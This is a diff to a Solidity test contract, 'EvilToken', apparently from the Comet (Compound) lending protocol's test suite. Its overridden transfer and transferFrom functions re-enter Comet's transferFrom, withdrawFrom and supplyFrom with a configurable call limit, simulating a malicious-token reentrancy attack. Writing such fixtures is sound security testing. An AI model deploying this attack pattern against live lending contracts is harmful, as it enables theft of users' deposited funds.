@@ -12,17 +12,21 @@ import "./FaucetToken.sol";
 contract EvilToken is FaucetToken {
     enum AttackType {
         TRANSFER_FROM,
-        WITHDRAW_FROM
+        WITHDRAW_FROM,
+        SUPPLY_FROM
     }
 
     struct ReentryAttack {
         AttackType attackType;
+        address source;
+        address destination;
         address asset;
-        address recipient;
         uint amount;
+        uint maxCalls;
     }
 
     ReentryAttack public attack;
+    uint public numberOfCalls = 0;
 
     constructor(
         uint256 _initialAmount,
@@ -32,9 +36,11 @@ contract EvilToken is FaucetToken {
     ) FaucetToken(_initialAmount, _tokenName, _decimalUnits, _tokenSymbol) {
         attack = ReentryAttack({
             attackType: AttackType.TRANSFER_FROM,
+            source: address(this),
+            destination: address(this),
             asset: address(this),
-            recipient: address(this),
-            amount: 1e6
+            amount: 1e6,
+            maxCalls: type(uint).max
         });
     }
 
@@ -47,17 +53,35 @@ contract EvilToken is FaucetToken {
     }
 
     function transfer(address dst, uint256 amount) external override returns (bool) {
+        return performAttack();
+    }
+
+    function transferFrom(address src, address dst, uint256 amount) external override returns (bool) {
+        return performAttack();
+    }
+
+    function performAttack() internal returns (bool) {
         ReentryAttack memory reentryAttack = attack;
-        if (reentryAttack.attackType == AttackType.TRANSFER_FROM) {
+        numberOfCalls++;
+        if (numberOfCalls > reentryAttack.maxCalls) {
+            // do nothing
+        } else if (reentryAttack.attackType == AttackType.TRANSFER_FROM) {
             Comet(payable(msg.sender)).transferFrom(
-                dst,
-                reentryAttack.recipient,
+                reentryAttack.source,
+                reentryAttack.destination,
                 reentryAttack.amount
             );
         } else if (reentryAttack.attackType == AttackType.WITHDRAW_FROM) {
             Comet(payable(msg.sender)).withdrawFrom(
-                dst,
-                reentryAttack.recipient,
+                reentryAttack.source,
+                reentryAttack.destination,
+                reentryAttack.asset,
+                reentryAttack.amount
+            );
+        } else if (reentryAttack.attackType == AttackType.SUPPLY_FROM) {
+            Comet(payable(msg.sender)).supplyFrom(
+                reentryAttack.source,
+                reentryAttack.destination,
                 reentryAttack.asset,
                 reentryAttack.amount
             );
@@ -66,4 +90,5 @@ contract EvilToken is FaucetToken {
         }
         return true;
     }
+
 }
